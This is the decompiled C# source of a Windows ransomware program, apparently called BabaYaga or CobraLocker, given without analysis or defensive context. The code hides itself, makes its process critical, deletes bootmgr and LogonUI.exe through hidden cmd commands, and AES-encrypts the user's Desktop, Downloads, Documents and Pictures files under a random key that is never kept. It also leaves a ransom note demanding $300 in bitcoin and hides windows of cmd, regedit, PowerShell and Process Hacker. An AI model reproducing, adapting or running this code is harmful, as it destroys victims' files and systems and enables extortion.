using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace BabaYaga;

public class Form1 : Form
{
	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
			File.WriteAllBytes(file, bytes2);
			File.Move(file, file + ".locked");
		}
	}

	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	private const int SW_HIDE = 0;

	private IContainer components = null;

	private Timer tmr_start_enc;

	private Timer tmr_del_desktop;

	private Timer message;

	private Timer tmr_if;

	public Form1()
	{
		InitializeComponent();
	}

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	[DllImport("User32")]
	private static extern int ShowWindow(int hwnd, int nCmdShow);

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Opacity(0.0);
		((Form)this).set_Size(new Size(50, 50));
		((Form)this).set_Location(new Point(-100, -100));
		message.Start();
		int processInformation = 1;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref processInformation, 4);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = "/k takeown /f C:\\bootmgr && icacls C:\\bootmgr /grant %username%:F && del C:\\bootmgr && takeown /f C:\\Windows\\System32\\LogonUI.exe && icacls C:\\Windows\\System32\\LogonUI.exe && del C:\\Windows\\System32\\LogonUI.exe && exit";
		Process.Start(processStartInfo);
	}

	private void Form_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	private void tmr_start_enc_Tick(object sender, EventArgs e)
	{
		tmr_start_enc.Stop();
		Start_Encrypt();
	}

	private void tmr_del_desktop_Tick(object sender, EventArgs e)
	{
		tmr_del_desktop.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\desktop.ini";
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string path2 = text + "\\desktop.ini";
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
		string path3 = folderPath2 + "\\desktop.ini";
		string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		string path4 = folderPath3 + "\\desktop.ini";
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		if (File.Exists(path2))
		{
			File.Delete(path2);
		}
		if (File.Exists(path3))
		{
			File.Delete(path3);
		}
		if (File.Exists(path4))
		{
			File.Delete(path4);
		}
		tmr_del_desktop.Start();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void Start_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string text2 = Path.Combine(environmentVariable, "Documents");
		string text3 = Path.Combine(environmentVariable, "Pictures");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		string[] files3 = Directory.GetFiles(text2 + "\\", "*", SearchOption.TopDirectoryOnly);
		string[] files4 = Directory.GetFiles(text3 + "\\", "*", SearchOption.AllDirectories);
		EncryptionFile encryptionFile = new EncryptionFile();
		string password = CreatePassword(999);
		for (int i = 0; i < files.Length; i++)
		{
			encryptionFile.EncryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			encryptionFile.EncryptFile(files2[j], password);
		}
		for (int k = 0; k < files4.Length; k++)
		{
			encryptionFile.EncryptFile(files4[k], password);
		}
		for (int l = 0; l < files3.Length; l++)
		{
			encryptionFile.EncryptFile(files3[l], password);
		}
	}

	public void create_message()
	{
		messageCreator();
	}

	public void messageCreator()
	{
		string userName = Environment.UserName;
		string text = "C:\\Users\\";
		string text2 = "\\Desktop\\readme.txt";
		string path = text + userName + text2;
		string[] contents = new string[19]
		{
			"Ooops! All your important files are encrypted!", "", "All you important files are encrypted with AES 256 algoritm. No one can help you to restore files without our special decryptor.", "All repair tools are useless.", "If you want to restore some your files for free write to email and attach 2-3 encrypted files ", "(non-archived and your files should not contain valuable information like databases, backups, large excel sheets etc.)", "You have to pay $300 in bitcoin to decrypt other files.", "As soon as we get bitcoins you'll get all your decrypted data back.", "", "P.S.",
			"Remember we are not scammers", "", "Contact:", "1.Download tor browser (https://www.torproject.org/)", "2.Create account on mail2tor (http://mail2tor2zyjdctd.onion/)", "3.Write e-mail to us (CobraLocker@mail2tor.com)", "", "That's all", "Good luck and have fun"
		};
		File.WriteAllLines(path, contents);
	}

	private void message_Tick(object sender, EventArgs e)
	{
		create_message();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void tmr_if_Tick(object sender, EventArgs e)
	{
		tmr_if.Stop();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == "cmd")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "regedit")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Processhacker")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "sdclt")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "powershell")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "processhacker")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Processhacker2")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "gpedit")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "gpedit.msc")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			tmr_if.Start();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_016a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0174: Expected O, but got Unknown
		components = new Container();
		tmr_start_enc = new Timer(components);
		tmr_del_desktop = new Timer(components);
		message = new Timer(components);
		tmr_if = new Timer(components);
		((Control)this).SuspendLayout();
		tmr_start_enc.set_Enabled(true);
		tmr_start_enc.set_Interval(3000);
		tmr_start_enc.add_Tick((EventHandler)tmr_start_enc_Tick);
		tmr_del_desktop.set_Enabled(true);
		tmr_del_desktop.add_Tick((EventHandler)tmr_del_desktop_Tick);
		message.set_Interval(6000);
		message.add_Tick((EventHandler)message_Tick);
		tmr_if.set_Enabled(true);
		tmr_if.set_Interval(10);
		tmr_if.add_Tick((EventHandler)tmr_if_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Form)this).set_ClientSize(new Size(120, 23));
		((Form)this).set_ControlBox(false);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
